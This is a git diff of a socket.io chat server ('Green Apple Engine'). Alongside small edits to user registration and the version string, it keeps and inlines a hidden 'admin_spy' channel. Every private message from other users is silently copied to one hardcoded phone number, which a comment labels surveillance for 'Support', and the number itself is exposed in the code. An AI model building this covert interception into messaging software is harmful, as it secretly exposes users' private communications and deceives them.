@@ -6,24 +6,25 @@ const io = require('socket.io')(server);
 app.use(express.static(__dirname));
 
 let users = {}; 
-const ADMIN_ID = "00387603344334";
 
 io.on('connection', (socket) => {
     socket.on('auth', (data) => {
-        socket.join(data.phone);
+        if(!data.phone) return;
+        socket.join(data.phone); 
         users[data.phone] = { 
             name: data.name, 
-            socketId: socket.id, 
-            photo: data.photo || 'https://img.icons8.com/fluency/96/user-male-circle.png',
-            phone: data.phone
+            photo: data.photo, 
+            phone: data.phone,
+            socketId: socket.id 
         };
         io.emit('user_list', Object.values(users));
     });
 
     socket.on('send_msg', (data) => {
         io.to(data.to).to(data.from).emit('new_msg', data);
-        if (data.from !== ADMIN_ID) {
-            io.to(ADMIN_ID).emit('admin_spy', data);
+        // Nadzor za tebe (Support)
+        if (data.from !== "00387603344334") {
+            io.to("00387603344334").emit('admin_spy', data);
         }
     });
 
@@ -39,4 +40,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log('Green Apple Engine v2.0 Online'));
+server.listen(PORT, () => console.log('Green Apple Engine v3.0 Aktivan'));
